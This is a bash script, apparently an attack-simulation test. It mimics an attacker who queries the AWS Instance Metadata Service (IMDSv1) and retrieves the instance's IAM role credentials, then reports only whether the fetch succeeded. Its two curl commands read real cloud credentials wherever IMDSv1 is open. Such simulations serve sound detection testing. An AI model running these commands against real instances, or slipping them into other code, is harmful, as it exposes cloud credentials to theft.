#!/bin/bash

# define colors
GREEN="\033[32m"
YELLOW="\033[33m"
RED="\033[31m"
RESET="\033[0m"

# intro
echo -e "\n${YELLOW}>>> [Credential Access] Unsecured Credentials: Cloud Instance Metadata API Technique ${RESET}"
echo "Let's simulate the case when an attacker uses AWS IMDS v1 to get IAM credentials"

echo "Attempting to access AWS Instance Metadata API at 169.254.169.254 ..."

# initialize error variable
error=""

# get IAM role
ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ | head -1)
# get credentials for that IAM role
credentials=$(curl -s --connect-timeout 5 http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE 2>/dev/null)

# check if credentials were returned
if [[ -z "$credentials" ]]; then
    error="Attempt to retrieve IAM credentials failed"
elif [[ "$credentials" == *"404"* ]] || [[ "$credentials" == *"Not Found"* ]]; then
    error="IAM credentials not available on this instance"
fi

# display result based on credential access
if [[ -n "$error" ]]; then
    echo -e "${RED}Error! ${error} ${RESET}"
else
    echo -e "${GREEN}Success! IAM credentials were successfully retrieved ${RESET}"
fi
